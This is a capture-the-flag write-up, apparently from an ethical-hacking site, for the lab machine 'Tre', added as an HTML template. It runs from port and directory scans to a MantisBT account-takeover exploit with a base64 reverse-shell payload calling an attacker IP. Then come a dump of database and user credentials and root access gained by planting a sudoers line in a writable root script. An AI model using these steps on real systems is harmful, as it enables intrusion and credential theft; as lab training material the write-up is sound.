@@ -1,0 +1,301 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Tre</h1>
+    <p class="text">Difficulty : Intermediate | CommunityRating : Hard | MyRating : Easy</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 99:1a:ea:d7:d7:b3:48:80:9f:88:82:2a:14:eb:5f:0e (RSA)
+|   256 f4:f6:9c:db:cf:d4:df:6a:91:0a:81:05:de:fa:8d:f8 (ECDSA)
+|_  256 ed:b9:a9:d7:2d:00:f8:1b:d3:99:d6:02:e5:ad:17:9f (ED25519)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Tre
+|_http-server-header: Apache/2.4.38 (Debian)
+8082/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Tre
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">Two http ports are open on 80 and 8082.</p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x html,php -u http://$IP -t 70</u>
+===============================================================
+/.hta.html            (Status: 403) [Size: 279]
+/.hta.php             (Status: 403) [Size: 279]
+/.hta                 (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.htaccess.php        (Status: 403) [Size: 279]
+/.htaccess.html       (Status: 403) [Size: 279]
+/.htpasswd.html       (Status: 403) [Size: 279]
+/.htpasswd.php        (Status: 403) [Size: 279]
+/cms                  (Status: 301) [Size: 314] [--&gt; http://192.168.160.84/cms/]
+/index.html           (Status: 200) [Size: 164]
+/index.html           (Status: 200) [Size: 164]
+/info.php             (Status: 200) [Size: 87816]
+/info.php             (Status: 200) [Size: 87816]
+/server-status        (Status: 403) [Size: 279]
+/system               (Status: 401) [Size: 461]
+
+===============================================================</code></pre></div>
+
+<p class="text">There is interesting page /cms. There is also /system dir, but it returns 401.</p>
+
+<div class="code-box"><pre><code> └─$ <u>feroxbuster -u http://$IP:8082</u>
+404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+
+200      GET      947l     5821w   407824c http://192.168.160.84:8082/file.jpg
+
+200      GET        8l       15w      164c http://192.168.160.84:8082/</code></pre></div>
+
+<p class="text">Because there is no directories, we can conclude this port is rabbit hole.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tre/1.png' %}" alt="">
+    <p class="text">The cms page holds button which seems to navigate us to login form. However, pressing the button returned nothing. Also, inspecting this page, the href attribute of this button isn't set. Therefore, this directory might be rabbit-hole.</p>
+</div>
+<p class="text">Before determine if it's not exploitable, we have to enumerate this dir further.</p>
+<p class="text">For ensuring it's rabbit-hole, I set url http://$IP, not http://$IP/cms.</p>
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster -u http://$IP > ferox</u>
+
+└─$ cat ferox | grep -Ewv '0l|lang|png|js|ttf|jpg|swf|css|eot|svg|woff|woff2|gif' | grep -E '301|200' 
+301      GET        9l       28w      314c http://192.168.160.84/cms => http://192.168.160.84/cms/
+301      GET        9l       28w      324c http://192.168.160.84/cms/templates => http://192.168.160.84/cms/templates/
+301      GET        9l       28w      320c http://192.168.160.84/cms/cache => http://192.168.160.84/cms/cache/
+...
+200      GET        8l       15w      164c http://192.168.160.84/
+301      GET        9l       28w      319c http://192.168.160.84/mantisbt => http://192.168.160.84/mantisbt/
+301      GET        9l       28w      325c http://192.168.160.84/mantisbt/admin => http://192.168.160.84/mantisbt/admin/
+301      GET        9l       28w      326c http://192.168.160.84/mantisbt/config => http://192.168.160.84/mantisbt/config/
+200      GET       83l      474w     3354c http://192.168.160.84/mantisbt/config/config_inc.php.sample
+200      GET       83l      474w     3411c http://192.168.160.84/mantisbt/config/a.txt
+...
+</u></code></pre></div>
+
+<p class="text">Interesting. I found new directory <u>mantisbt</u>. Because the dir /cms doesn't function well, I assume /mantisbt is the main target and set first priority.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tre/2.png' %}" alt="">
+    <p class="text">This page is using bug tracker softrare <u>mantis</u>.</p>
+</div>
+
+
+<p class="text">Simple google research returned me <a href="https://www.exploit-db.com/exploits/48818">this</a> poc. Though we don't know it's version, it's possible we can use this. Since it doesn't take time, let's try to this poc file.</p>
+
+<div class="code-box"><pre><code>└─$ <u>wget https://www.exploit-db.com/exploits/48818</u></code></pre></div>
+
+<p class="text">Since it has several custom variables, we have to edit them.</p>
+
+<div class="code-box"><pre><code>class exploit():
+        def __init__(self):
+                self.s = requests.Session()
+                self.headers = dict() # Initialize the headers dictionary
+                self.RHOST = "192.168.160.84" # Victim IP
+                self.RPORT = "80" # Victim port
+                self.LHOST = "192.168.45.205" # Attacker IP
+                self.LPORT = "4444" # Attacker Port
+                self.verify_user_id = "1" # User id for the target account
+                self.realname = "administrator" # Username to hijack
+                self.passwd = "password" # New password after account hijack
+                self.mantisLoc = "/mantisbt" # Location of mantis in URL
+                self.ReverseShell = "echo " + b64encode("bash -i >& /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0>&1") + " | base64 -d | /bin/bash" # Reverse shell payload</code></pre></div>
+
+                <p class="text">We can use this poc with changing RHOST,RPORT,LHOST, and LPORT variables.</p>
+                <p class="text">Before execute this poc, pls open listner with nc.</p>
+
+<div class="code-box"><pre><code>└─$ python2 48818
+Successfully hijacked account!
+Successfully logged in!
+Triggering reverse shell
+Cleaning up
+Deleting the dot_tool config.
+Deleting the relationship_graph_enable config.
+Successfully cleaned up
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.206] from (UNKNOWN) [192.168.142.84] 35462
+bash: cannot set terminal process group (569): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@tre:/var/www/html/mantisbt$ </code></pre></div>
+
+<p class="text">Fortunately, we could skip troublesome deeper enumeration steps.</p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">Before enumerater the target sysmtem, let's make this connection stable. I used code below.</p>
+<div class="code-box"><pre><code>script /dev/null -c /bin/bash
+Script started, output log file is '/dev/null'.
+$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+
+$ stty raw -echo; fg
+nc -lnvp 4444
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen</code></pre></div>
+
+<div class="code-box"><pre><code>idwww-data@tre:/var/www/html/mantisbt$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@tre:/var/www/html/mantisbt$ </code></pre></div>
+
+<p class="text">Then we got www-data user.</p>
+<div class="code-box"><pre><code>www-data@tre:/var/www/html/mantisbt/config$ cat config_inc.php | grep password -2
+$g_database_name          = 'mantis';
+$g_db_username            = 'mantissuser';
+$g_db_password            = 'password@123AS';
+
+$g_default_timezone       = 'America/New_York';
+www-data@tre:/var/www/html/mantisbt/config$ </code></pre></div>
+
+<p class="text">The file <u>config_inc.php</u> under /var/www/html/mantisbt/config has credential for mysql.</p>
+
+<div class="code-box"><pre><code>www-data@tre:/var/www/html/mantisbt/config$ mysql -u mantissuser -ppassword@123AS
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 105
+Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mantis             |
++--------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [(none)]> </code></pre></div>
+<div class="code-box"><pre><code>MariaDB [mantis]> use mantis;
+MariaDB [mantis]> select * from mantis_user_table;
++----+---------------+---------------+----------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
+| id | username      | realname      | email          | password                         | enabled | protected | access_level | login_count | lost_password_request_count | failed_login_count | cookie_string                                                    | last_visit | date_created |
++----+---------------+---------------+----------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
+|  1 | administrator | administrator | root@localhost | 5f4dcc3b5aa765d61d8327deb882cf99 |       1 |         0 |           90 |          36 |                           0 |                  0 | n35EcLL9bCwj2NLfKdf3NAydVHeNJhHcHQrATmWa0fSlRNvbPgnFzMP9_S1cnzAr | 1762047007 |            1 |
+|  2 | tre           | Tr3@123456A!  | tre@localhost  | 64c4685f8da5c2225de7890c1bad0d7f |       1 |         0 |           70 |           0 |                           0 |                  0 | bp9uP3SY4tyKMFHSytb2RyecV5fPrsvGjb4sLboLkoyodEPn0NbZID9GhRURGAvf | 1589263108 |   1589263108 |
++----+---------------+---------------+----------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
+2 rows in set (0.000 sec)
+
+MariaDB [mantis]> </code></pre></div>
+
+<p class="text">We got password <u>Tr3@123456A!</u> for tre user.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>└─$ ssh tre@192.168.142.84
+The authenticity of host '192.168.142.84 (192.168.142.84)' can't be established.
+ED25519 key fingerprint is SHA256:1ZfYO3DGJA+iL5+oiLgoa4kQETeZ48YhrRrPnTvJb3A.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:8: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.142.84' (ED25519) to the list of known hosts.
+tre@192.168.142.84's password: 
+Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+tre@tre:~$ </code></pre></div>
+
+<p class="text">Next, let's enumerate target system.</p>
+
+<div class="code-box"><pre><code>tre@tre:~$ sudo -l
+Matching Defaults entries for tre on tre:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tre may run the following commands on tre:
+    (ALL) NOPASSWD: /sbin/shutdown</code></pre></div>
+
+    <p class="text">We can shutdown target system. Though this function doesn't provide us direct PrivEsc vector, we can make use of this when we could change code of some running program. Let's check if there is running process with pspy64.</p>
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+
+tre@tre:~$ wget http://192.168.45.206:8000/pspy64
+--2025-11-01 21:49:49--  http://192.168.45.206:8000/pspy64
+Connecting to 192.168.45.206:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: 'pspy64'
+
+pspy64          100%[=======>]   2.96M  2.65MB/s    in 1.1s    
+
+2025-11-01 21:49:50 (2.65 MB/s) - 'pspy64' saved [3104768/3104768]
+
+tre@tre:~$ chmod +x pspy64</code></pre></div>
+
+<div class="code-box"><pre><code>tre@tre:~$ ./pspy64
+...
+2025/11/01 21:50:47 CMD: UID=0     PID=4154   | /bin/bash /usr/bin/check-system                                                 
+2025/11/01 21:50:48 CMD: UID=0     PID=4155   | /bin/bash /usr/bin/check-system                                                 
+2025/11/01 21:50:49 CMD: UID=0     PID=4157   | /bin/bash /usr/bin/check-system                                                 
+2025/11/01 21:50:50 CMD: UID=0     PID=4158   | /bin/bash /usr/bin/check-system</code></pre></div>
+
+<p class="text">We can see binary /usr/bin/check-system is executed every seconds.</p>
+
+<div class="code-box"><pre><code>tre@tre:~$ ls -la /usr/bin/check-system
+-rw----rw- 1 root root 135 May 12  2020 /usr/bin/check-system</code></pre></div>
+
+<p class="text">Also, this file is writable. We can add code to this file and reboot the target system, then we can execute arbitrary code.</p>
+
+<div class="code-box"><pre><code>tre@tre:~$ which nano
+/usr/bin/nano</code></pre></div>
+
+<p class="text">We can use nano for text editor.</p>
+
+<div class="code-box"><pre><code>tre@tre:~$ cat /usr/bin/check-system
+DATE=`date '+%Y-%m-%d %H:%M:%S'`
+echo "Service started at ${DATE}" | systemd-cat -p info
+
+<u>echo 'tre ALL=(ALL:ALL) ALL' > /etc/sudoers.d/tre</u>
+
+while :
+do
+echo "Checking...";
+sleep 1;
+done</code></pre></div>
+
+<p class="text">I added line which makes tre enable to run any command as root user.</p>
+<p class="text">Then, let's reboot the system.</p>
+
+<div class="code-box"><pre><code>tre@tre:~$ <u>sudo /sbin/shutdown -r now</u>
+tre@tre:~$ Connection to 192.168.142.84 closed by remote host.
+Connection to 192.168.142.84 closed.</code></pre></div>
+
+<p class="text">Next time we re-connect to the target system, we can use any command with sudo privilege.</p>
+
+
+
+<div class="code-box"><pre><code>tre@tre:~$ sudo -l
+Matching Defaults entries for tre on tre:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tre may run the following commands on tre:
+    (ALL) NOPASSWD: /sbin/shutdown
+    (ALL : ALL) ALL</code></pre></div>
+    <p class="text">We can simply generate bash with sudo command.</p>
+
+<div class="code-box"><pre><code>tre@tre:~$ sudo bash
+[sudo] password for tre: Tr3@123456A!
+root@tre:/home/tre# </code></pre></div>
+
+<p class="text">We got root user.</p>
+
+
+</body>
+</html>
